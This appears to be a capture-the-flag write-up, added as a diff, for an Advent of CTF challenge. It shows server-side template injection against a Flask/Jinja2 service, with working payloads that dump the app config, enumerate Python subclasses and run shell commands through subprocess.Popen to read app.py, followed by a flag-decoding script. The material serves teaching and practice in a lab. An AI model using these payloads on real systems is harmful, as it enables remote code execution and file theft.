@@ -1,0 +1,97 @@
+#+TITLE: Advent of CTF - Challenge 16
+#+SUBTITLE: "Encoded"
+
+* Challenge
+
+In this challenge the use of templates is the thing to focus on. The emoji service by Santa is quite cool, but it used templates to render data, making it vulnerable to Server Side Template Injection.
+
+What you will learn:
+
+- Identify SSTI
+- Use SSTI to read program variables
+- Use SSTI to read files from the filesystem
+- Use some python
+
+* Solution
+:PROPERTIES:
+:ATTACH_DIR: /home/arjen/Projects/credmp.github.io/writeups/advent-of-ctf/challenge-16/index_att
+:END:
+
+#+CAPTION: Challenge start
+[[file:index_att/start.png]]
+
+The service will lookup the emoji for the word that you enter, such as Santa. Pro tip, in the sourcecode of the page is a link to a list of all supported emojis for extra fun. After trying several payloads you will eventually try ={{7*7}}=. This will render =49=.
+
+#+CAPTION: Finding SSTI
+[[file:index_att/ssti-found.png]]
+
+Pro tip: [[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection][Payload All The Things]] has a very nice list of payloads you can try. You will come to the conclusion that this is a Python Flask application using Jinja2.
+
+The next thing to try is to grab the =config= variable from the application. This can be done through the use of the =config= variable name inside a template.
+
+#+CAPTION: Reading the config variable
+#+begin_src javascript
+{{config}}
+#+end_src
+
+This will list the application configuration. The =config= contains a =flag=, but it looks very weird. It is encoded using an unknown algorithm.
+
+#+CAPTION: Finding the flag
+[[file:index_att/encoded-flag.png]]
+
+Looking at the available classes in the application, using Payload all the Things as a guide, it is clear that many classes are available.
+
+#+CAPTION: Reading the classes available
+#+begin_src javascript
+{{ ''.__class__.__mro__[1].__subclasses__()}}
+#+end_src
+
+When run in the application a long list of classes are listed. A class such as =subprocess= is required in order to execute things on the file system. The exact index is required in order to use it, so start counting....
+
+#+CAPTION: All the subclasses
+[[file:index_att/classes.png]]
+
+Not necessary of course! The below python helper script will find it for you. Just copy the data into a file called =data.txt= and run the script.
+
+#+CAPTION: Python helper script
+#+begin_src python
+#!/usr/bin/env python3
+
+with open('data.txt') as p:
+    check = p.read()
+
+for index,value in enumerate(check.split(',')):
+    if "<class 'subprocess.Popen'>" in value:
+        print(index)
+#+end_src
+
+In my case it was index =286=. Experiment with calling the process. In the end you will end up with something like the below listing. It calls =cat app.py= and then using =communicate()= to retrieve the data from the proces.
+
+#+CAPTION: Getting the file contents
+#+begin_src javascript
+{{ ''.__class__.__mro__[1].__subclasses__()[286]('cat app.py',shell=True,stdout=-1)
+   .communicate()[0].strip()}}
+#+end_src
+
+The sourcecode is then shown on the webpage. Reading it shows there is a =magic= function that encodes/decodes the flag. It does this by reading the flag from =/tmp/flag.txt=, this flag is set there during the =supervisor= startup and is not readable for the application.
+
+[[file:index_att/sourcecode.png]]
+
+Copy the code to your favorite editor and recreate the =magic= function. In a python shell it looks like this:
+
+[[file:index_att/magic.png]]
+
+#+CAPTION: Running the decoder
+#+begin_src javascript
+def magic(flag, key):
+    return ''.join(chr(x ^ ord(flag[x]) ^ ord(key[::-1][x]) ^ ord(key[x])) for x in range(len(flag)))
+ 
+flag="HKQ\x1f\x7f~e|\x06{r9<\x03/3z\x12#Rr )G#*\x14,#dp=Z@AP\x0c*"
+magic(flag, '112f3a99b283a4e1788dedd8e0e5d35375c33747')
+#+end_src
+ 
+The challenge is solved, also don't forget the badge!
+
+[[./index_att/badge.png]]
+
+Go back to the [[../../../index.org][homepage]].
